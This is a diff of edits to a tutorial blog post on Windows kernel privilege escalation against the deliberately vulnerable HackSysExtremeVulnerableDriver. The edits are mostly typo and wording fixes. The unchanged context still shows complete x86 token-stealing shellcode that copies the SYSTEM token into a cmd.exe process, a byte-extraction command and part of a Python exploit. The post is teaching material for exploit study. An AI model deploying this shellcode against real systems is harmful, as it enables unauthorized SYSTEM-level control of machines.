@@ -43,8 +43,9 @@ link:https://securityintelligence.com/identifying-named-pipe-impersonation-and-o
 that can be used to do that. Most of them (ab)use the privilege model
 implemented by Windows.
 
-In Windows, when the system starts, a process called `SYSTEM` is created,
-always with `PID` 4.
+In Windows, when the system starts, a process called `System` is created,
+always with `PID` 4. As this process is owned by the `SYSTEM` user, we will
+use this as the target process to steal the ticket from.
 
 image::sysprocess2.png[SYSTEM processes]
 
@@ -57,8 +58,8 @@ by the `LSASS` process.
 
 image::token1.png[Security Token]
 
-It is used to perform operations on the system
-based on the permissions granted to that token. For example, if a process
+The token is used to perform operations on the system
+based on the permissions granted to it. For example, if a process
 wants to read a file, that file security descriptor will check if the
 token of process has the permissions to do it. This is what is known as
 Discretionary Access Control List or `DACL`.
@@ -73,9 +74,8 @@ To do that, we first need to get the offset of the `Token` field in the
 
 image::token2.png[Security Token]
 
-As you see, it is at `_EPROCESS+0x0fc`
-
-Then, we need to get the `SYSTEM` process descriptor:
+As you see, it is at `_EPROCESS+0x0fc`. With that, we need to get the `SYSTEM`
+process descriptor:
 
 image::sysprocess1.png[SYSTEM process]
 
@@ -88,7 +88,7 @@ privileges:
 
 image::before1.png[Before Privilege Escalation]
 
-Then, we must get the `cmd.exe` process descriptor:
+We must get the `cmd.exe` process descriptor:
 
 image::cmdprocess1.png[CMD process]
 
@@ -113,16 +113,16 @@ position-independent code.
 * Find the `cmd.exe` process.
 * Find the `SYSTEM` process (with `PID` 4).
 * Grab the `Token` from the `SYSTEM` process.
-* Copy the token from process `SYSTEM` to the `cmd.exe` process
-* Restore execution
-* Enjoy
+* Copy the token from process `SYSTEM` to the `cmd.exe` process.
+* Restore execution.
+* Enjoy.
 
 The first step is to find a fixed position from where we can get the required
 structures as an offset. According to
 link:https://en.wikipedia.org/wiki/Win32_Thread_Information_Block[this entry],
 we can access the `_NT_TIB` structure from the `fs` segment selector. This
 structure holds information of the current running thread (in our case, that
-would be the exploit). The article also says that we can reach the `_KTRHEAD`
+would be the exploit). The article also says that we can reach the `_KTHREAD`
 structure at `fs+0x124`. With that, we can start writing some assembler:
 
 [source,x86asm]
@@ -183,8 +183,8 @@ find_cmd:
 mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                         ; of current process
 sub ecx, 0x0b8                          ; Point to current _EPROCESS
-cmp dword [ecx+0x0b4], edx          	; Check if this entry belongs to `cmd.exe`
-jne find_cmd							; If not, go to the next entry of ActiveProcessLinks
+cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
+jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
 ----
 
 Then, find the `_EPROCESS` structure for the `SYSTEM` process:
@@ -200,8 +200,8 @@ find_cmd:
 mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                         ; of current process
 sub ecx, 0x0b8                          ; Point to current _EPROCESS
-cmp dword [ecx+0x0b4], edx          	; Check if this entry belongs to `cmd.exe`
-jne find_cmd							; If not, go to the next entry of ActiveProcessLinks
+cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
+jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
 mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
 mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
 find_system:
@@ -209,7 +209,7 @@ mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                         ; of current process
 sub ecx, 0x0b8                          ; Point to current _EPROCESS
 cmp dword [ecx+0x0b4], 4            	; Check if this entry belongs to PID 4 = SYSTEM
-jne find_system							; If not, go to the next entry of ActiveProcessLinks
+jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
 ----
 
 We then must move the token from `SYSTEM` to `cmd.exe`:
@@ -225,23 +225,23 @@ find_cmd:
 mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                         ; of current process
 sub ecx, 0x0b8                          ; Point to current _EPROCESS
-cmp dword [ecx+0x0b4], edx          	; Check if this entry belongs to `cmd.exe`
-jne find_cmd							; If not, go to the next entry of ActiveProcessLinks
+cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
+jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
 mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
 mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
 find_system:
 mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                         ; of current process
 sub ecx, 0x0b8                          ; Point to current _EPROCESS
-cmp dword [ecx+0x0b4], 4            	; Check if this entry belongs to PID 4 = SYSTEM
-jne find_system							; If not, go to the next entry of ActiveProcessLinks
+cmp dword [ecx+0x0b4], 4                ; Check if this entry belongs to PID 4 = SYSTEM
+jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
 add ecx, 0x0fc                          ; ECX now points to the Token of SYSTEM
 mov ecx, [ecx]                          ; Copy contents of Token to ECX
 mov [edi+0x0fc], ecx                    ; Move the Token of SYSTEM to cmd.exe
 ----
 
-And finally restore execution. As we are writing in the stack, we will surely
-mangle immediate stack frames of caller functions. If we look at the stack
+And finally restore execution. As we are writing in the stack, we had surely
+mangled immediate stack frames of caller functions. If we look at the stack
 after executing the shellcode, we can see that there is a stack frame at which
 we can return to, located at `esp+0x10`:
 
@@ -260,16 +260,16 @@ find_cmd:
 mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                         ; of current process
 sub ecx, 0x0b8                          ; Point to current _EPROCESS
-cmp dword [ecx+0x0b4], edx          	; Check if this entry belongs to `cmd.exe`
-jne find_cmd							; If not, go to the next entry of ActiveProcessLinks
+cmp dword [ecx+0x0b4], edx              ; Check if this entry belongs to `cmd.exe`
+jne find_cmd                            ; If not, go to the next entry of ActiveProcessLinks
 mov edi, ecx                            ; EDI now points to cmd.exe _EPROCESS
 mov ecx, eax                            ; Rewind to interate using ECX over ActiveProcessLinks
 find_system:
 mov ecx, dword [ecx+0x0b8]          	; ECX points to ActiveProcessLinks
                                         ; of current process
 sub ecx, 0x0b8                          ; Point to current _EPROCESS
-cmp dword [ecx+0x0b4], 4            	; Check if this entry belongs to PID 4 = SYSTEM
-jne find_system							; If not, go to the next entry of ActiveProcessLinks
+cmp dword [ecx+0x0b4], 4                ; Check if this entry belongs to PID 4 = SYSTEM
+jne find_system                         ; If not, go to the next entry of ActiveProcessLinks
 add ecx, 0x0fc                          ; ECX now points to the Token of SYSTEM
 mov ecx, [ecx]                          ; Copy contents of Token to ECX
 mov [edi+0x0fc], ecx                    ; Move the Token of SYSTEM to cmd.exe
@@ -300,9 +300,9 @@ $ for i in $(objdump -d steal.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i
 \xfc\x00\x00\x00\x61\x31\xc0\x40\x83\xc4\x10\x5d\xc2\x08\x00
 ----
 
-Now, let's pick the exploit from the link:../hevd-smep-bypass/[last post],
+Let's pick the exploit from the link:../hevd-smep-bypass/[last post],
 and update the shellcode. I also added some `print` calls that helps
-to understand at what part of the exploit we are now:
+to trace at what stage of the exploit we are now:
 
 [source,python]
 ----
@@ -314,7 +314,7 @@ Vulnerable Software: HackSysExtremeVulnerableDrive
 Version: 3.00
 Exploit Author: Andres Roldan
 Tested On: Windows 10 1703
-Writeup: https://fluidattacks.com/blog/hevd-smep-bypass/
+Writeup: https://fluidattacks.com/blog/hevd-privilege-escalation/
 """
 
 import struct
@@ -402,7 +402,7 @@ copy it to our `cmd.exe` shell. Now, we own the system!
 
 == Conclusions
 
-It was fun to steal the `SYSTEM` process token and write it to our own
+It was fun to steal the `SYSTEM` process token and pass it to our own
 parent process. There are many other ways of gaining Local Privilege Escalation
 but this method is one of the most used because it is extremely reliable if
 you can restore the execution of the kernel.
